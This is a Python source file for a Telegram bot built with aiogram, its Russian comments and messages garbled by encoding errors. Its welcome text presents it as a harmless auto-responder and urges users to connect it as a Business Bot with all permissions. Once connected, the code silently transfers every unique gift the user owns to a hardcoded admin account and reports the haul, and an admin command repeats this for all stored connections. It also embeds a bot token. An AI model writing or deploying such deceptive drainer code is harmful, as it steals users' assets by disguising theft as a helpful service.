from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods import GetBusinessAccountGifts, TransferGift, GetBusinessAccountStarBalance, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
import logging
import asyncio
import json
import os
from datetime import datetime
import sys
import io
# sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
TOKEN = os.getenv("BOT_TOKEN", "7339741334:AAGKYivJ5ttvDxvC4OgAXpQs0quNQHpn0ww")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1948254891"))
TRANSFER_DELAY = 1  # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:  # ‚Üê –î–æ–±–∞–≤—å encoding
            content = f.read().strip()
            return json.loads(content) if content else []
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ {filename}: {str(e)}")
        return []

def save_to_json(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as f:  # ‚Üê –î–æ–±–∞–≤—å encoding
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è {filename}: {str(e)}")

def log_transfer(user_id, gift_id, status, error=""):
    try:
        logs = []
        if os.path.exists(TRANSFER_LOG_FILE):
            with open(TRANSFER_LOG_FILE, "r", encoding="utf-8") as f:  # ‚Üê encoding —Ç—É—Ç
                logs = json.load(f)
        
        logs.append({...})  # –¥–∞–Ω–Ω—ã–µ
        
        with open(TRANSFER_LOG_FILE, "w", encoding="utf-8") as f:  # ‚Üê –∏ —Ç—É—Ç
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –ª–æ–≥–∞: {str(e)}")

# –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
async def transfer_all_unique_gifts(bot: Bot, business_connection_id: str, user_id: int) -> dict:
    """
    –ü–µ—Ä–µ–≤–æ–¥–∏—Ç –≤—Å–µ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞ ADMIN_ID
    """
    result = {
        "total": 0,
        "transferred": 0,
        "failed": 0,
        "errors": []
    }

    try:
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                result["errors"].append("–ù–µ–≤–µ—Ä–Ω—ã–π business_connection_id. –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç–µ –±–æ—Ç–∞.")
                return result
            raise

        if not gifts.gifts:
            return result

        for gift in gifts.gifts:
            if gift.type != "unique":
                continue

            result["total"] += 1
            
            try:
                await bot(TransferGift(
                    business_connection_id=business_connection_id,
                    new_owner_chat_id=ADMIN_ID,
                    owned_gift_id=gift.owned_gift_id,
                    star_count=gift.transfer_star_count
                ))
                result["transferred"] += 1
                log_transfer(user_id, gift.owned_gift_id, "success")
                await asyncio.sleep(1)  # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏

            except TelegramBadRequest as e:
                error_msg = getattr(e, "message", str(e))
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)
                
                if "BOT_ACCESS_FORBIDDEN" in error_msg:
                    break  # –ü—Ä–µ—Ä—ã–≤–∞–µ–º –µ—Å–ª–∏ –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞

            except Exception as e:
                error_msg = str(e)
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)
                

    except Exception as e:
        error_msg = str(e)
        logging.error(f"–û—à–∏–±–∫–∞ –≤ transfer_all_unique_gifts: {error_msg}")
        result["errors"].append(error_msg)
        

    return result


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        connections = load_json_file(CONNECTIONS_FILE)
        connections = [c for c in connections if c["user_id"] != user_id]  # –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—ã–µ –∑–∞–ø–∏—Å–∏
        connections.append({
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": datetime.now().isoformat()
        })
        save_to_json(CONNECTIONS_FILE, connections)

        # –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–∏
        transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º –æ—Ç—á–µ—Ç
        report = (
            f"üîó –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ:\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '–Ω–µ—Ç'}\n"
            f"üÜî ID: {user_id}\n\n"
            f"üìä –†–µ–∑—É–ª—å—Ç–∞—Ç –ø–µ—Ä–µ–≤–æ–¥–∞:\n"
            f"‚Ä¢ –í—Å–µ–≥–æ –ø–æ–¥–∞—Ä–∫–æ–≤: {transfer_result['total']}\n"
            f"‚Ä¢ –£—Å–ø–µ—à–Ω–æ: {transfer_result['transferred']}\n"
            f"‚Ä¢ –û—à–∏–±–æ–∫: {transfer_result['failed']}\n"
        )
        
        if transfer_result['errors']:
            report += "\n–û—à–∏–±–∫–∏:\n" + "\n".join(f"‚Ä¢ {e}" for e in transfer_result['errors'][:3])  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 3 –æ—à–∏–±–∫–∏
        
        await bot.send_message(ADMIN_ID, report)
        await bot.send_message(user_id, "‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω! –£–≤–∞–∂–∞–µ–º–∞—è –∫–æ–º–∏—Å—Å–∏—è —Å–µ–π—á–∞—Å –±—É–¥–µ—Ç –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç–∏—Ä–æ–≤–∞–Ω –≤–µ—Å—å —Ñ—É–Ω–∫–∏–æ–Ω–∞–ª")

    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ handle_business_connect: {e}")
        await bot.send_message(ADMIN_ID, f"üö® –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏: {str(e)}")

@dp.message(F.text == "/check_gifts")
async def check_gifts_handler(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    connections = load_json_file(CONNECTIONS_FILE)
    if not connections:
        return await message.answer("–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")
    
    for conn in connections:
        try:
            result = await transfer_all_unique_gifts(bot, conn["business_connection_id"], conn["user_id"])
            msg = (
                f"–ü—Ä–æ–≤–µ—Ä–∫–∞ {conn.get('username', conn['user_id'])}:\n"
                f"‚Ä¢ –ü–µ—Ä–µ–¥–∞–Ω–æ: {result['transferred']}\n"
                f"‚Ä¢ –û—à–∏–±–æ–∫: {result['failed']}"
            )
            await message.answer(msg)
            await asyncio.sleep(5)  # –ß—Ç–æ–±—ã –Ω–µ –ø–æ–ª—É—á–∏—Ç—å flood control
        except Exception as e:
            await message.answer(f"–û—à–∏–±–∫–∞ –¥–ª—è {conn['user_id']}: {str(e)}")
            
@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        welcome_text = """
üëã <b>–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é!</b> –Ø ‚Äî –≤–∞—à –ª–∏—á–Ω—ã–π <i>Telegram-–∞–≤—Ç–æ–æ—Ç–≤–µ—Ç—á–∏–∫</i>! ‚ú®

üìå <b>–ö–∞–∫ –Ω–∞—á–∞—Ç—å —Ä–∞–±–æ—Ç—É?</b>
1. –î–æ–±–∞–≤—å—Ç–µ –º–µ–Ω—è –∫–∞–∫ <b>Business Bot</b> –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö Telegram
2. –í—ã–¥–∞–π—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
3. –Ø –Ω–∞—á–Ω—É –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–≤–µ—á–∞—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è!

üîπ <i>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ:</i>
‚Ä¢ –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞ ‚Üí –ß–∞—Ç-–±–æ—Ç—ã</b>
‚Ä¢ –í—ã–±–µ—Ä–∏—Ç–µ –º–µ–Ω—è –∏ –∞–∫—Ç–∏–≤–∏—Ä—É–π—Ç–µ –≤—Å–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è!

üöÄ –ü–æ—Å–ª–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —è —Å–º–æ–≥—É:
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–≤–µ—á–∞—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
‚Ä¢ –ü–æ–Ω–∏–º–∞—Ç—å —Å–æ–±–µ—Å–µ–¥–Ω–∏–∫–∞ –∏ –µ—Å–ª–∏ —á—Ç–æ –ø–æ–º–æ—á—å
‚Ä¢ –†–∞–±–æ—Ç–∞—Ç—å 24/7 –±–µ–∑ –≤–∞—à–µ–≥–æ —É—á–∞—Å—Ç–∏—è!

<b>–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å?</b> –ñ–¥—É –≤–∞—à–µ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è! üòä
        """
        await message.answer(welcome_text, parse_mode="HTML")
    else:
        admin_text = f"""
üõ†Ô∏è <b>–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞</b> üõ†Ô∏è

‚Ä¢ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–π: <b>{count}</b>
‚Ä¢ –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
  /gifts ‚Äî –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤
  /stars ‚Äî –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥
  /transfer ‚Äî –†—É—á–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞
  /convert ‚Äî –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤

‚öôÔ∏è –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!
        """
        await message.answer(admin_text, parse_mode="HTML")
        


# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
async def main():
    logging.info("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())



